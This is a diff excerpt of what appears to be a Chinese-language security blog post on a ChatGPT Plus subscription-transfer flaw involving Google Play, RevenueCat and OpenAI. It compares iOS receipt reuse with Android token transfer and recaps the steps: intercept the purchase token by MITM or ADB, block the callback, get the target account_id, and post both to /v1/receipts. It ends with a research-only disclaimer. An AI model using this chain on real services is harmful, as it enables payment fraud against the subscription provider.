-| 中间层 | 直接对接 OpenAI | 经过 RevenueCat |
-| 核心资产 | iOS receipt（Base64） | purchase token |
-| 能否复用 | 能，一张收据开无数账号 | 不能，一个 token 只能用一次 |
-| 成本模型 | 一次付费 - 无限开通 | 一次付费 - 一次开通 |
-| 获取难度 | 需要 iOS 设备 + 拦截 | Android + MITM 或 Root |
-| 修复状态 | 部分修复 | 未修复 |
-
-Android 这个转移漏洞的成本比 iOS 高（每开一个账号都需要一个新 token），但更稳定，因为它利用的是 RevenueCat 的设计缺陷，不是简单的验证遗漏，修起来牵涉面更广。
-
----
-
-## 十、回顾
-
-整条攻击链路如下：
-
-```
-Google Play 支付 → 拦截 purchase token → 阻断 RevenueCat 回调
-                                            ↓
-目标账号 account_id ← Session 解析 ← 用户提交
-                                            ↓
-POST /v1/receipts (token + account_id) → RevenueCat 验证
-                                            ↓
-                                       OpenAI 开通 Plus
-```
-
-RevenueCat 在验证 purchase token 时只关心两件事：token 是不是真的、有没有被用过。至于"谁付的钱"和"给谁开通"是不是同一个人，它不管。这就是整条链路的根本缺陷。
-
-OpenAI 大概率不是不能修，而是优先级排不上来。要么放弃 RevenueCat 自建订阅系统（工程量巨大），要么让 RC 在 API 层面增加 app_user_id 校验。对于 B 端收入占大头的公司来说，个人订阅上的这个洞不够紧急。
-
-回顾一下整条链路的关键节点：Google Play / RevenueCat / OpenAI 三层解耦，token 通过 MITM 拦截或 ADB 直读 library.db 获取，目标 account_id 从 `/accounts/check` API 或 Session JSON 拿到，最后 `POST /v1/receipts` 把 token 和 account_id 拼在一起提交。72 小时内没用掉的 token 会被 Google Play 自动退款。
-
-提醒：本文仅供技术研究和安全交流。Google Play 订阅体系的安全性问题是一个值得关注的研究方向，请不要将本文技术用于非法用途。
-
----
-
-## 参考资料
-
-- [RevenueCat 官方文档 - POST /v1/receipts](https://docs.revenuecat.com/)
-- [Google Play Billing Library 安全最佳实践](https://developer.android.com/google/play/billing/security)
-- [OWASP Mobile Top 10](https://owasp.org/www-project-mobile-top-10/)
-- [mitmproxy 官方文档](https://docs.mitmproxy.org/)
-- [Android Debug Bridge (ADB) 文档](https://developer.android.com/tools/adb)
-
----
-
-标签: #ChatGPT #GPTPlus #GooglePlay #RevenueCat #订阅转移 #Android #支付安全 #技术科普
+*文中所涉协议公钥、订单号与账户 UUID 均已脱敏处理，仅作移动内购架构安全防御讨论。*
